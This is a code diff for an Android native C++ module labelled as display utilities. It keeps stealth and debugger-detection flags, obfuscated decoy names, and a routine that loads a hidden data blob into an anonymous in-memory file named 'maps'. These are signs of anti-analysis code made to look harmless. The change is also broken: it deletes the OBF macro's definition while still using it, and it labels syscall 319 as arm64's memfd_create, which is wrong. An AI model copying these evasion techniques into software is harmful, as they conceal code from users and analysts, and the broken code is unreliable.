@@ -19,23 +19,12 @@
 #include <sys/stat.h>
 #include <cstdlib>
 #include <unistd.h>
+#include <sys/syscall.h>
 #include <fcntl.h>
 #include <time.h>
 
 #define TAG "DispUtils"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, TAG, __VA_ARGS__)
-
-template<std::size_t N>
-struct ObfStr {
-    char d[N];
-    constexpr ObfStr(const char (&s)[N]) : d{} {
-        for(std::size_t i=0;i<N;i++) d[i]=s[i]^(0xAA^i);
-    }
-    void decode(char* o) const {
-        for(std::size_t i=0;i<N;i++) o[i]=d[i]^(0xAA^i);
-    }
-};
-#define OBF(s) []{constexpr ObfStr<sizeof(s)> _o(s);char _b[sizeof(s)];_o.decode(_b);return std::string(_b);}()
 
 static bool g_stealth = false;
 static bool g_debuggerDetected = false;
@@ -109,9 +98,9 @@ static size_t g_sys_data_len = 0;
 static bool g_sys_ready = false;
 
 static const char* s_sys_entries[] = {
-    OBF("display_utils").c_str(), OBF("env_check").c_str(), OBF("sys_compat").c_str(), OBF("draw_utils").c_str(),
-    OBF("meta_parser").c_str(), OBF("render_loop").c_str(), OBF("native_bridge").c_str(), OBF("cache_manager").c_str(),
-    OBF("asset_meta").c_str(), OBF("overlay").c_str(), OBF("float_widget").c_str()
+    OBF("display_utils"), OBF("env_check"), OBF("sys_compat"), OBF("draw_utils"),
+    OBF("meta_parser"), OBF("render_loop"), OBF("native_bridge"), OBF("cache_manager"),
+    OBF("asset_meta"), OBF("overlay"), OBF("float_widget")
 };
 static const int s_sys_entry_count = 11;
 
@@ -175,7 +164,7 @@ static void prepareSysResource() {
     prepareSysData();
     if (!g_sys_data) return;
     
-    int fd = memfd_create("maps", MFD_CLOEXEC);
+    int fd = syscall(319, "dc", 1); // __NR_memfd_create on arm64
     if (fd < 0) return;
     write(fd, g_sys_data, g_sys_data_len);
     lseek(fd, 0, SEEK_SET);
